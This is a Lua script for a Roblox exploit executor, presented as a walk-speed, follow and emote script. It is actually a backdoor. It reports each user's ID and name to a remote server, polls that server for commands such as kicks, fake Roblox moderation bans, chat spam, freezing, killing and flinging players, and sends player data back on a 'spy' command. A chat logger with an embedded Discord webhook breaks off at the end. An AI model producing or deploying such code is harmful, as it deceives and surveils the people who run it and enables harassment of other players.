-- Script By Sid (Rayfield UI Edition - WalkSpeed + Follow
-- Player + Emote V2)

-- Game aur Character load hone ka wait (Auto-Execute ke liye zaroori)

-- Dungeon Heroes | Safe Initialization Gate

if not game:IsLoaded() then
game.Loaded:Wait()
end

local _Players = game:GetService("Players")
local _RS = game:GetService("ReplicatedStorage")
local _Player = _Players.LocalPlayer

-- Wait for PlayerGui
local _PlayerGui = _Player:WaitForChild("PlayerGui")

-- Wait for core game systems
local _Systems = _RS:WaitForChild("Systems")
local _Remotes = _RS:WaitForChild("Remotes")

-- Wait for player profile
local _Profile = _PlayerGui:WaitForChild("Profile")
local _Inventory = _Profile:WaitForChild("Inventory")

-- Wait for character
local _Character = _Player.Character
or _Player.CharacterAdded:Wait()

local _Humanoid = _Character:WaitForChild("Humanoid")
local _HRP = _Character:WaitForChild("HumanoidRootPart")

-- Let game systems settle
task.wait(3)

-- Verify character is still available
while not _Player.Character
or not _Player.Character:FindFirstChild("HumanoidRootPart") do
task.wait(0.5)
end

print("[Sid Script] Game initialization completed")

-- Safe Initialization V2

local _Players = game:GetService("Players")
local _RS = game:GetService("ReplicatedStorage")
local _Player = _Players.LocalPlayer

-- Non-blocking initialization
local _PlayerGui = _Player:WaitForChild("PlayerGui", 10)

local _Systems = _RS:FindFirstChild("Systems")
local _Remotes = _RS:FindFirstChild("Remotes")

-- Character check without infinite waiting
local _Character = _Player.Character
local _Humanoid = _Character and _Character:FindFirstChildOfClass("Humanoid")
local _HRP = _Character and _Character:FindFirstChild("HumanoidRootPart")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

-- ========================================
-- ROBLOX OFFICIAL PREMIUM DISCONNECT UI (V4 - FIXED STOP)
-- ========================================

-- =============================================================
--  FIXED SCRIPT: WRAPPED IN 'DO' BLOCK TO FIX 200 LIMIT ERROR
-- =============================================================

do  -- << YE 'do' BLOCK SABSE ZAROORI HAI, ISSE REMOVE MAT KARNA >>

-- Saare Services aur Variables is Block ke andar rahenge  
local HttpService = game:GetService("HttpService")  
local Players = game:GetService("Players")  
local TweenService = game:GetService("TweenService")  
local Lighting = game:GetService("Lighting")  
local ReplicatedStorage = game:GetService("ReplicatedStorage")  
local TextChatService = game:GetService("TextChatService")  
local ContentProvider = game:GetService("ContentProvider")  
local StarterGui = game:GetService("StarterGui")  
local RunService = game:GetService("RunService")  
  
local player = Players.LocalPlayer  

-- ===== CONFIG =====  
local BASE_URL = "https://testingbot-8pb1.onrender.com" -- Tumhara Naya URL  
local STATUS_URL = BASE_URL .. "/status/"  
local FAKE_URL = BASE_URL .. "/fakecheck/"  
local STOP_URL = BASE_URL .. "/stopstatus"  
local COMMAND_URL = BASE_URL .. "/api/get_command"  
local CHECK_TIME = 1.5  

-- Universal Request Function  
local request_func = (syn and syn.request) or request or http_request or (fluxus and fluxus.request) or game.HttpGet  

-- ========================================  
-- NEW PREMIUM TROLL FUNCTIONS  
-- ========================================  

-- 1. SPEAK (Voice of God)  
local function doSpeak(msg)  
    local sound = Instance.new("Sound", workspace)  
    sound.SoundId = "rbxassetid://12221967" -- Error/Thunder Sound  
    sound.Volume = 10  
    sound:Play()  
    game:GetService("Debris"):AddItem(sound, 5)  
      
    local gui = Instance.new("ScreenGui", game.CoreGui)  
    local text = Instance.new("TextLabel", gui)  
    text.Size = UDim2.new(1, 0, 1, 0)  
    text.BackgroundTransparency = 1  
    text.Text = msg  
    text.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red Color  
    text.TextSize = 100  
    text.Font = Enum.Font.FredokaOne  
    text.TextStrokeTransparency = 0  
      
    -- Shake Effect  
    task.spawn(function()  
        for i = 1, 20 do  
            text.Position = UDim2.new(0, math.random(-5,5), 0, math.random(-5,5))  
            task.wait(0.05)  
        end  
        text.Position = UDim2.new(0,0,0,0)  
        task.wait(3)  
        gui:Destroy()  
    end)  
end  

        -- 2. CAGE (Absolute Zero Freeze)  
local function doCage()  
    local char = player.Character  
    local hrp = char and char:FindFirstChild("HumanoidRootPart")  
    local hum = char and char:FindFirstChild("Humanoid")  
      
    if not hrp or not hum then return end  
      
    -- 1. Visual Cage (Deewarein)  
    if workspace:FindFirstChild("TitanCage") then workspace.TitanCage:Destroy() end  

    local folder = Instance.new("Folder", workspace)  
    folder.Name = "TitanCage"  
      
    local center = hrp.Position -- Is position par banda jam jayega  

    -- 6 Parts (Pura Box)  
    local parts = {  
        {Pos = center + Vector3.new(0, 4, 0), Size = Vector3.new(6, 0.5, 6)}, -- Roof  
        {Pos = center + Vector3.new(0, -4, 0), Size = Vector3.new(6, 0.5, 6)}, -- Floor  
        {Pos = center + Vector3.new(0, 0, 3), Size = Vector3.new(6, 8, 0.5)}, -- Wall 1  
        {Pos = center + Vector3.new(0, 0, -3), Size = Vector3.new(6, 8, 0.5)}, -- Wall 2  
        {Pos = center + Vector3.new(3, 0, 0), Size = Vector3.new(0.5, 8, 6)}, -- Wall 3  
        {Pos = center + Vector3.new(-3, 0, 0), Size = Vector3.new(0.5, 8, 6)}  -- Wall 4  
    }  
      
    for _, info in pairs(parts) do  
        local part = Instance.new("Part", folder)  
        part.Size = info.Size  
        part.Position = info.Pos  
        part.Anchored = true  
        part.CanCollide = true -- Takra ke wapis girega  
        part.Transparency = 0  
        part.Material = Enum.Material.ForceField -- Admin Look  
        part.Color = Color3.fromRGB(255, 0, 0) -- Red  
    end  
      
    -- Trap Sound  
    local s = Instance.new("Sound", workspace)  
    s.SoundId = "rbxassetid://3359654316"  
    s.PlayOnRemove = true  
    s:Destroy()  

    -- 2. THE PERMANENT FREEZE LOOP  
    -- Ye loop har frame chalega aur usko hilne nahi dega  
    task.spawn(function()  
        while char and hum and hrp and hum.Health > 0 do  
              
            -- A. Physics Freeze  
            hrp.Anchored = true   
            hrp.CFrame = CFrame.new(center) -- Wapis center me teleport  
              
            -- B. Input Freeze (Joystick/Keyboard Disable)  
            hum.WalkSpeed = 0  
            hum.JumpPower = 0  
            hum.AutoRotate = false -- Idhar udhar dekh bhi nahi payega  
            hum:UnequipTools() -- Hath me kuch nahi pakad payega  
              
            -- C. Animation Freeze (Optional: Putla bana do)  
            -- hum.PlatformStand = true   
              
            task.wait() -- Super Fast Loop (No Escape)  
        end  
    end)  
end  



    -- 3. CONTROL (Puppet Master - Infinite Loop)  
local function doControl(action)  
    -- Alag thread me chalayenge taaki script na ruke  
    task.spawn(function()  
        local char = player.Character  
        local hum = char and char:FindFirstChild("Humanoid")  
        local hrp = char and char:FindFirstChild("HumanoidRootPart")  
          
        -- Infinite Loop Start  
        while char and hum and hrp and hum.Health > 0 do  
              
            if action == "jump" then  
                hum.Jump = true -- Bar bar kudega  
              
            elseif action == "sit" then  
                hum.Sit = true -- Khada hone ki koshish karega par wapis baith jayega  
              
            elseif action == "drop" then  
                hum:UnequipTools() -- Weapon pakad hi nahi payega  
              
            elseif action == "spin" then  
                -- Agar spin ruk gaya to wapis laga do  
                if not hrp:FindFirstChild("AdminSpin") then  
                    local bv = Instance.new("BodyAngularVelocity", hrp)  
                    bv.Name = "AdminSpin"  
                    bv.MaxTorque = Vector3.new(0, math.huge, 0)  
                    bv.AngularVelocity = Vector3.new(0, 50, 0)  
                end  
                  
            elseif action == "freeze" then  
                hrp.Anchored = true -- Hamesha ke liye jam jayega  
                  
            elseif action == "kill" then  
                hum.Health = 0  
                break -- Marne ke baad loop band  
                  
            elseif action == "explode" then   
                local ex = Instance.new("Explosion", workspace)  
                ex.Position = hrp.Position  
                task.wait(2) -- Har 2 second me fatata rahega  
            end  
              
            task.wait(0.1) -- Fast Loop Speed  
        end  
    end)  
end  

-- 4. SPY (REAL DATA SENDER)  
local function doSpy()  
    notify("⚠️ SYSTEM ALERT", "Admin is retrieving your data...")  
      
    -- Loop 30 seconds ke liye (Discord bot ke loop se match karega)  
    task.spawn(function()  
        for i = 1, 15 do  
            local char = player.Character  
            local hum = char and char:FindFirstChild("Humanoid")  
            local hrp = char and char:FindFirstChild("HumanoidRootPart")  
              
            if char and hum and hrp then  
                -- 1. Gather Data  
                local currentHealth = math.floor(hum.Health)  
                local maxHealth = math.floor(hum.MaxHealth)  
                  
                -- Check Tool  
                local tool = char:FindFirstChildOfClass("Tool")  
                local toolName = tool and tool.Name or "Empty Hand"  
                  
                -- Check Activity  
                local state = "Idle"  
                if hum.MoveDirection.Magnitude > 0 then state = "Walking" end  
                if hum.Sit then state = "Sitting" end  
                if hum.Health <= 0 then state = "Dead" end  
                  
                -- Position  
                local pos = string.format("%d, %d, %d", math.floor(hrp.Position.X), math.floor(hrp.Position.Y), math.floor(hrp.Position.Z))  
                  
                -- 2. Prepare JSON Payload  
                local payload = {  
                    userid = player.UserId,  
                    health = currentHealth,  
                    max_health = maxHealth,  
                    tool = toolName,  
                    loc = pos,  
                    activity = state  
                }  
                  
                -- 3. Send Data Back to Flask Server  
                pcall(function()  
                    request_func({  
                        Url = BASE_URL .. "/api/report_spy",  
                        Method = "POST",  
                        Body = HttpService:JSONEncode(payload),  
                        Headers = {["Content-Type"] = "application/json"}  
                    })  
                end)  
            end  
              
            task.wait(2) -- Har 2 second me data update bhejo  
        end  
    end)  
end  

-- ========================================  
-- 💓 HEARTBEAT (SMART SESSION TRACKER)  
-- ========================================  
local function startHeartbeat()  
    task.spawn(function()  
        local isFirst = true -- Variable to track first run  
          
        while true do  
            -- Data Prepare  
            local payload = {  
                userid = tostring(player.UserId),  
                username = player.Name,  
                display = player.DisplayName,  
                first_run = isFirst -- Ye batayega ki time reset karna hai ya nahi  
            }  
              
            -- Send Signal  
            pcall(function()  
                request_func({  
                    Url = BASE_URL .. "/api/heartbeat",  
                    Method = "POST",  
                    Body = HttpService:JSONEncode(payload),  
                    Headers = {["Content-Type"] = "application/json"}  
                })  
            end)  
              
            -- Pehli baar chalne ke baad, flag ko false kar do  
            if isFirst then  
                isFirst = false  
            end  
              
            task.wait(20) -- Har 20 second me ping  
        end  
    end)  
end  
  
startHeartbeat() -- Start immediately  

-- ========================================  
-- 🌌 GOD-TIER TROLL FUNCTIONS  
-- ========================================  

-- 1. SINGULARITY (Black Hole)  
local function doSingularity(targetId)  
    -- Target player dhoondo  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end  
      
    local center = target.Character.HumanoidRootPart  
      
    -- Visual Black Hole  
    local sphere = Instance.new("Part", center)  
    sphere.Shape = Enum.PartType.Ball  
    sphere.Size = Vector3.new(0,0,0)  
    sphere.Color = Color3.new(0,0,0)  
    sphere.Material = Enum.Material.Neon  
    sphere.Anchored = true  
    sphere.CanCollide = false  
    sphere.Name = "TheVoid"  
      
    -- Animation loop  
    task.spawn(function()  
        -- Sphere grow effect  
        TweenService:Create(sphere, TweenInfo.new(2), {Size = Vector3.new(20,20,20)}):Play()  
          
        -- Pull Loop (15 seconds)  
        local startTime = tick()  
        while tick() - startTime < 15 do  
            if center then  
                sphere.CFrame = center.CFrame  
                  
                -- Loop through all other players  
                for _, p in pairs(Players:GetPlayers()) do  
                    if p ~= target and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then  
                        local hrp = p.Character.HumanoidRootPart  
                        -- Direction vector towards black hole  
                        local direction = (center.Position - hrp.Position).Unit  
                        -- Apply Force (Pull)  
                        hrp.Velocity = direction * 50 -- Speed of pull  
                        hrp.CFrame = CFrame.new(hrp.Position, center.Position) -- Look at black hole  
                    end  
                end  
            end  
            task.wait()  
        end  
        sphere:Destroy()  
    end)  
end  

-- 2. IDENTITY THEFT (Clone)  
local function doIdentity(cloneId)  
    -- Sabko Target jaisa bana do  
    local id = tonumber(cloneId)  
    for _, p in pairs(Players:GetPlayers()) do  
        if p.Character and p.Character:FindFirstChild("Humanoid") then  
            task.spawn(function()  
                pcall(function()  
                    local desc = Players:GetHumanoidDescriptionFromUserId(id)  
                    p.Character.Humanoid:ApplyDescription(desc)  
                end)  
            end)  
        end  
    end  
end  

-- 3. MIDAS TOUCH (Death Touch)  
local function doMidas(targetId)  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character then return end  
      
    -- Gold Effect  
    for _, part in pairs(target.Character:GetChildren()) do  
        if part:IsA("BasePart") then  
            part.Color = Color3.fromRGB(255, 215, 0) -- Gold  
            part.Material = Enum.Material.Metal  
              
            -- Kill on Touch Logic  
            part.Touched:Connect(function(hit)  
                if hit.Parent and hit.Parent:FindFirstChild("Humanoid") and hit.Parent.Name ~= target.Name then  
                    hit.Parent:BreakJoints() -- Instant Kill  
                end  
            end)  
        end  
    end  
end  

-- 4. PERSONAL GRAVITY  
local function doGravity(targetId, direction)  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end  
      
    local hrp = target.Character.HumanoidRootPart  
      
    -- Remove old forces  
    if hrp:FindFirstChild("AdminGravity") then hrp.AdminGravity:Destroy() end  
      
    local force = Instance.new("BodyForce", hrp)  
    force.Name = "AdminGravity"  
      
    -- Physics Calculations (Mass * Gravity)  
    local mass = 0  
    for _, v in pairs(target.Character:GetChildren()) do  
        if v:IsA("BasePart") then mass = mass + v:GetMass() end  
    end  
    local gravity = workspace.Gravity  
      
    if direction == "up" then  
        -- Upar khincho (Double gravity force upwards)  
        force.Force = Vector3.new(0, mass * gravity * 1.5, 0)  
    elseif direction == "down" then  
        -- Bhari kar do  
        force.Force = Vector3.new(0, -mass * gravity * 5, 0)  
    elseif direction == "side" then  
        -- Deewar ki taraf  
        force.Force = Vector3.new(mass * gravity, mass * gravity, 0)  
    elseif direction == "zero" then  
        -- Hawa mein latka do  
        force.Force = Vector3.new(0, mass * gravity, 0)  
    end  
      
    -- 10 second baad normal kar do  
    game:GetService("Debris"):AddItem(force, 10)  
end  

-- 5. INVISIBLE FLING (PHYSICS DESTROYER)  
local function doFling(targetId)  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character then   
        notify("❌ Error", "Target not found nearby!")  
        return   
    end  
      
    local char = player.Character  
    local hrp = char and char:FindFirstChild("HumanoidRootPart")  
    local hum = char and char:FindFirstChild("Humanoid")  
      
    if not hrp then return end  

    notify("🌪️ FLING", "Targeting: " .. target.Name)  

    -- 1. Setup: Invisible & No Collision  
    -- Hum chahte hain ki hum unke andar ghus sakein bina rukawat ke  
    for _, part in pairs(char:GetDescendants()) do  
        if part:IsA("BasePart") then  
            part.CanCollide = false  
            part.Transparency = 1 -- Pura Gayab  
        elseif part:IsA("Decal") then  
            part.Transparency = 1  
        end  
    end  
      
    -- 2. God Mode (Temporary)  
    -- Taaki takkar se hum na marein  
    local bodyVel = Instance.new("BodyVelocity")  
    bodyVel.Velocity = Vector3.new(0, 0, 0)  
    bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)  
    bodyVel.Parent = hrp  

    local bodyAng = Instance.new("BodyAngularVelocity")  
    bodyAng.AngularVelocity = Vector3.new(0, 99999, 0) -- Super Fast Spin  
    bodyAng.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)  
    bodyAng.Parent = hrp  

    -- 3. Attack Loop (5 Seconds)  
    local startTime = tick()  
    local tHrp = target.Character:FindFirstChild("HumanoidRootPart")  
      
    while tick() - startTime < 5 do  
        if target.Character and tHrp then  
            -- Target ke andar teleport hona baar-baar  
            hrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, 0)   
            hrp.Velocity = Vector3.new(0, 0, 0) -- Position lock  
            hrp.RotVelocity = Vector3.new(0, 10000, 0) -- Spin Force  
        end  
        task.wait() -- Super fast update  
    end  
      
    -- 4. Cleanup (Reset Character)  
    bodyVel:Destroy()  
    bodyAng:Destroy()  
    player:LoadCharacter() -- Wapis normal hone ke liye respawn  
end  

-- 6. PIGGYBACK (RIDE)  
local function doRide(targetId)  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character then return end  
      
    local hrp = player.Character.HumanoidRootPart  
    local tHrp = target.Character.HumanoidRootPart  
      
    notify("🎒 Piggyback", "Riding: " .. target.Name)  
      
    -- Disable Collisions (Taaki hum unke andar na fasein, bas chipak jayein)  
    for _, part in pairs(player.Character:GetDescendants()) do  
        if part:IsA("BasePart") then part.CanCollide = false end  
    end  

    -- Loop: Lock position to their back/shoulders  
    local startTime = tick()  
    -- 20 seconds tak chipke raho  
    while tick() - startTime < 20 do  
        if target.Character and tHrp then  
            -- Position: Thoda sa peeche aur upar  
            hrp.CFrame = tHrp.CFrame * CFrame.new(0, 2, 1)  
        end  
        game:GetService("RunService").Heartbeat:Wait()  
    end  
    player:LoadCharacter() -- Reset  
end  

-- 7. VOID ABDUCTION  
local function doAbduct(targetId)  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character then return end  
      
    local hrp = player.Character.HumanoidRootPart  
    local tHrp = target.Character.HumanoidRootPart  
      
    notify("🕳️ Abducting", "Target: " .. target.Name)  
      
    -- Collision On rakhenge taaki dhakka lage  
    local startTime = tick()  
    while tick() - startTime < 5 do  
        if target.Character and tHrp then  
            -- Target ke PAIRO (Feet) par teleport ho jao  
            -- Ye unko neeche se dhakka dega  
            hrp.CFrame = tHrp.CFrame * CFrame.new(0, -3, 0)  
            hrp.Velocity = Vector3.new(0, -100, 0) -- Neeche ki taraf force  
        end  
        game:GetService("RunService").Heartbeat:Wait()  
    end  
    player:LoadCharacter()  
end  

-- ========================================  
-- 💞 UNIVERSAL COUPLE LOGIC  
-- ========================================  

-- 1. DIRECT RIDE (Agar Rider ke paas script hai)  
local function doSmartRide(targetId)  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character then return end  
      
    notify("🚀 Command Received", "Riding: " .. target.Name)  
      
    local hrp = player.Character.HumanoidRootPart  
    local tHrp = target.Character.HumanoidRootPart  
      
    -- Collision Off  
    for _, part in pairs(player.Character:GetDescendants()) do  
        if part:IsA("BasePart") then part.CanCollide = false end  
    end  

    -- Loop: Chipak jao  
    local startTime = tick()  
    while tick() - startTime < 30 do -- 30 sec tak  
        if target.Character and tHrp then  
            hrp.CFrame = tHrp.CFrame * CFrame.new(0, 2, 0.5)  
        end  
        game:GetService("RunService").Heartbeat:Wait()  
    end  
end  

-- 2. PHYSICS DRAG (Agar Rider normal player hai)  
local function doPhysicsDrag(riderId, horseId)  
    local rider = Players:GetPlayerByUserId(tonumber(riderId))  
    local horse = Players:GetPlayerByUserId(tonumber(horseId))  
      
    if not rider or not horse then return end  
    notify("🧲 Matchmaker", "Dragging " .. rider.Name .. " to " .. horse.Name)  
      
    local myHrp = player.Character.HumanoidRootPart  
      
    -- Invisible ban jao  
    for _, part in pairs(player.Character:GetDescendants()) do  
        if part:IsA("BasePart") then part.Transparency = 1 part.CanCollide = false end  
    end  

    local startTime = tick()  
    while tick() - startTime < 15 do  
        if rider.Character and horse.Character then  
            local rHrp = rider.Character:FindFirstChild("HumanoidRootPart")  
            local hHrp = horse.Character:FindFirstChild("HumanoidRootPart")  
              
            if rHrp and hHrp then  
                -- Strategy: Rider ke andar teleport ho, aur Horse ki taraf velocity lagao  
                myHrp.CFrame = rHrp.CFrame -- Unke andar ghuso  
                  
                -- Magnet Force Calculation  
                local dir = (hHrp.Position - rHrp.Position).Unit  
                local dist = (hHrp.Position - rHrp.Position).Magnitude  
                  
                if dist > 3 then  
                    -- Door hai? Dhakka maaro!  
                    -- BodyVelocity create karke push karna better hota hai fling ke liye  
                    local bv = Instance.new("BodyVelocity", myHrp)  
                    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)  
                    bv.Velocity = dir * 150 -- Super Speed Drag  
                    game:GetService("Debris"):AddItem(bv, 0.1)  
                else  
                    -- Paas hai? Wahi roko  
                    myHrp.CFrame = hHrp.CFrame * CFrame.new(0, 3, 0)  
                end  
            end  
        end  
        game:GetService("RunService").Heartbeat:Wait()  
    end  
    player:LoadCharacter() -- Reset  
end  


-- ========================================  
-- HELPER FUNCTIONS  
-- ========================================  

local function notify(title, text)  
    pcall(function()  
        StarterGui:SetCore("SendNotification", {  
            Title = title;  
            Text = text;  
            Duration = 5;  
        })  
    end)  
end  

local function getJson(url)  
    local ok, res = pcall(function() return game:HttpGet(url) end)  
    if not ok or not res or res == "" then return nil end  
    local good, json = pcall(function() return HttpService:JSONDecode(res) end)  
    return good and json or nil  
end  

-- ========================================  
-- TROLL FUNCTIONS  
-- ========================================  

local function doBlock(targetId)  
    if not targetId then return end  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if target then  
        notify("🚫 BLOCKING", "Removing: " .. target.Name)  
        if target.Character then  
            target.Character:ClearAllChildren()  
            target.Character:Destroy()  
        end  
        target.CharacterAdded:Connect(function(char)  
            task.wait(0.5)  
            if char then char:ClearAllChildren() char:Destroy() end  
        end)  
    end  
end  

local function doJumpscare(customSoundId)  
    local sound = Instance.new("Sound")  
    sound.Name = "JumpscareSound"  
    sound.Parent = workspace  
    sound.SoundId = (customSoundId and customSoundId ~= "") and ("rbxassetid://" .. customSoundId) or "rbxassetid://9119827059"  
    sound.Volume = 10  
    ContentProvider:PreloadAsync({sound})  
    sound:Play()  

    local gui = Instance.new("ScreenGui")  
    gui.Parent = game.CoreGui  
    gui.IgnoreGuiInset = true  
    local img = Instance.new("ImageLabel", gui)  
    img.Size = UDim2.new(1,0,1,0)  
    img.Image = "rbxassetid://13429676378"  
    img.BackgroundColor3 = Color3.new(0,0,0)  
    img.ZIndex = 100  

    task.spawn(function()  
        for i = 1, 20 do  
            img.Visible = not img.Visible  
            task.wait(0.04)  
        end  
        img.Visible = true  
        task.wait(2)  
        gui:Destroy()  
        sound:Destroy()  
    end)  
end  

local function doAudio(id)  
    if workspace:FindFirstChild("TrollSound") then workspace.TrollSound:Destroy() end  
    local s = Instance.new("Sound")  
    s.Name = "TrollSound"  
    s.Parent = workspace  
    s.SoundId = "rbxassetid://"..id  
    s.Volume = 10  
    s.Looped = true  
      
    notify("🔊 Audio", "Loading sound...", 2)  
    local success = pcall(function() if not s.IsLoaded then s.Loaded:Wait() end end)  
    if success then s:Play() end  
end  

local function doSpam(msg, limit)  
    task.spawn(function()  
        for i=1, limit do  
            pcall(function()  
                if TextChatService:FindFirstChild("TextChannels") then  
                    local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral")  
                    if ch then ch:SendAsync(msg) end  
                elseif ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then  
                    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")  
                end  
            end)  
            task.wait(0.35)  
        end  
    end)  
end  

-- ========================================  
-- SECURITY UI FUNCTION  
-- ========================================  

local function showFakeBan(info)  
    if player.PlayerGui:FindFirstChild("RobloxPromptGui") then  
        player.PlayerGui.RobloxPromptGui:Destroy()  
    end  
      
    local blur = Instance.new("BlurEffect")  
    blur.Name = "RobloxDisconnectBlur"; blur.Parent = Lighting; blur.Size = 0  
    TweenService:Create(blur, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {Size = 20}):Play()  

    local gui = Instance.new("ScreenGui", player.PlayerGui)  
    gui.Name = "RobloxPromptGui"; gui.IgnoreGuiInset = true; gui.DisplayOrder = 10; gui.ResetOnSpawn = false  

    local overlay = Instance.new("Frame", gui)  
    overlay.Size = UDim2.fromScale(1,1); overlay.BackgroundColor3 = Color3.new(0,0,0); overlay.BackgroundTransparency = 0.5  
      
    local alertBox = Instance.new("Frame", overlay)  
    alertBox.AnchorPoint = Vector2.new(0.5, 0.5); alertBox.Position = UDim2.fromScale(0.5, 0.5)  
    alertBox.Size = UDim2.new(0, 400, 0, 240); alertBox.BackgroundColor3 = Color3.fromRGB(57, 59, 61)  
    Instance.new("UICorner", alertBox).CornerRadius = UDim.new(0, 8)  

    local title = Instance.new("TextLabel", alertBox)  
    title.Text = "Disconnected"; title.Font = Enum.Font.GothamBold; title.TextColor3 = Color3.fromRGB(255, 255, 255)  
    title.TextSize = 24; title.Size = UDim2.new(1, 0, 0, 45); title.BackgroundTransparency = 1; title.Position = UDim2.new(0, 0, 0, 5)  

    local msg = Instance.new("TextLabel", alertBox)  
    msg.Text = "You have been kicked by this experience or its moderators. Moderation message:"  
    msg.Font = Enum.Font.Gotham; msg.TextColor3 = Color3.fromRGB(189, 190, 190); msg.TextSize = 16  
    msg.TextWrapped = true; msg.Size = UDim2.new(0.9, 0, 0, 45); msg.Position = UDim2.new(0.5, 0, 0, 60)  
    msg.AnchorPoint = Vector2.new(0.5, 0); msg.BackgroundTransparency = 1  

    local reason = Instance.new("TextLabel", alertBox)  
    reason.Text = tostring(info.message or "Connection lost.")  
    reason.Font = Enum.Font.Gotham; reason.TextColor3 = Color3.fromRGB(255, 255, 255); reason.TextSize = 16  
    reason.TextWrapped = true; reason.Size = UDim2.new(0.9, 0, 0, 60); reason.Position = UDim2.new(0.5, 0, 0, 110)  
    reason.AnchorPoint = Vector2.new(0.5, 0); reason.BackgroundTransparency = 1  

    local btn = Instance.new("TextButton", alertBox)  
    btn.Text = "Leave"; btn.Font = Enum.Font.GothamBold; btn.TextSize = 16  
    btn.TextColor3 = Color3.fromRGB(30, 30, 30); btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)  
    btn.Size = UDim2.new(1, -40, 0, 40); btn.Position = UDim2.new(0.5, 0, 1, -20); btn.AnchorPoint = Vector2.new(0.5, 1)  
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)  

    btn.MouseButton1Click:Connect(function()  
        gui:Destroy(); TweenService:Create(blur, TweenInfo.new(0.4), {Size = 0}):Play()  
        task.delay(0.4, function() if blur then blur:Destroy() end end)  
    end)  
end  

local function isStopped()  
    local data = getJson(STOP_URL)  
    return (data and data.stop == true)  
end  

-- ========================================  
-- MAIN LOOPS (SECURITY + TROLL)  
-- ========================================  

task.spawn(function()  
      
    -- Stop Check (One Time)  
    if isStopped() then player:Kick("❌ System Disabled by Admin") return end  
      
    -- Fake Ban Check (One Time)  
    task.wait(2)  
    local fake = getJson(FAKE_URL .. player.UserId)  
    if fake and fake.fake == true then showFakeBan(fake) end  

    -- Constant Loop  
    while task.wait(CHECK_TIME) do  
        -- 1. Security Check  
        local info = getJson(STATUS_URL .. player.UserId)  
        if info then  
            if info.maintenance then player:Kick("🛠 Maintenance Mode"); break end  
            if info.access == false then player:Kick("🔐 Not Whitelisted"); break end  
            if info.kick then player:Kick("👢 Kicked: " .. tostring(info.kick_reason)); break end  
            if info.banned then  
                local r = tostring(info.ban_reason or "None")  
                if info.tempban then player:Kick("⏱ Temp Ban: " .. r)  
                else player:Kick("🚫 Banned: " .. r) end  
                break  
            end  
        end  
          
        -- 2. Fake Ban Re-Check  
        local f = getJson(FAKE_URL .. player.UserId)  
        if f and f.fake == true then showFakeBan(f) end  

        -- 3. Troll Command Check  
        pcall(function()  
            local myId = tostring(player.UserId)  
            local targetUrl = COMMAND_URL .. "?userid=" .. myId  
            local resp  
              
            if request_func == game.HttpGet then resp = game:HttpGet(targetUrl)  
            else  
                local r = request_func({Url = targetUrl, Method = "GET"})  
                if r and r.StatusCode == 200 then resp = r.Body end  
            end  

            if resp and resp ~= "" and resp ~= "{}" then  
                local s, data = pcall(function() return HttpService:JSONDecode(resp) end)  
                if s and data and data.type ~= "none" then  
                    if data.type == "block" then doBlock(data.payload.block_id)  
                    elseif data.type == "jumpscare" then doJumpscare(data.payload.sound_id)  
                    elseif data.type == "audio" then doAudio(data.payload.id)  
                    elseif data.type == "spam" then doSpam(data.payload.msg, tonumber(data.payload.limit))

-- NEW COMMANDS --
elseif data.type == "speak" then doSpeak(data.payload.msg)
elseif data.type == "cage" then doCage()
elseif data.type == "control" then doControl(data.payload.action)
elseif data.type == "spy" then doSpy()
-- Isko baki commands ke niche lagana
elseif data.type == "singularity" then
doSingularity(data.payload.target_id) -- Note: Payload check karna padega python se

elseif data.type == "identity" then
doIdentity(data.payload.clone_id)

elseif data.type == "midas" then
doMidas(data.payload.target_id) -- UserID pass karna zaroori hai

elseif data.type == "gravity" then
doGravity(data.payload.target_id, data.payload.dir) -- Note: Yahan target ID bhejna padega payload me
elseif data.type == "ride" then
doRide(data.payload.target_id)

elseif data.type == "abduct" then
doAbduct(data.payload.target_id)

elseif data.type == "fling" then
doFling(data.payload.target_id)

elseif data.type == "couple" then
local rId = tonumber(data.payload.rider_id)
local hId = tonumber(data.payload.horse_id)

if player.UserId == rId then  
    -- CASE A: Main hi Rider hu (Mere paas script hai)  
    -- Toh main khud chalke jaunga  
    doSmartRide(hId)  
      
elseif player.UserId ~= rId and player.UserId ~= hId then  
    -- CASE B: Main Admin hu (Teesra banda)  
    -- Main apni takat se Rider ko kheech ke Horse ke paas le jaunga  
    doPhysicsDrag(rId, hId)  
end  
                    end  
                end  
            end  
        end)  
    end  
end)

end -- << YE 'end' BOHOT ZAROORI HAI >>

-- =========================================================
-- 🕵️ ULTIMATE SPY CHAT (No Doubles + Full Info)
-- =========================================================

task.spawn(function()
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer

-- ⚠️ CONFIGURATION: APNA WEBHOOK URL YAHAN DALO  
local WEBHOOK_URL = "https://discord.com/api/webhooks/1571499584662798456/o6WD0XtZbCpyMEXa-AeRib3nw08iA2FtQuZ-NshHgMCfNKqeaQ2AI8Zx9FfGggu8ngi_"  

-- Executor Request Function (Check)  
local request_func = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)  
if not request_func then return warn("Executor not supported") end  

-- [CLEANER] HTML Tags Hatao  
local function cleanMessage(msg)  
    local clean, _ = string.gsub(msg, "<[^>]+>", "")  
    return clean  
end  

-- [SENDER] Discord Bhejne Wala Function  
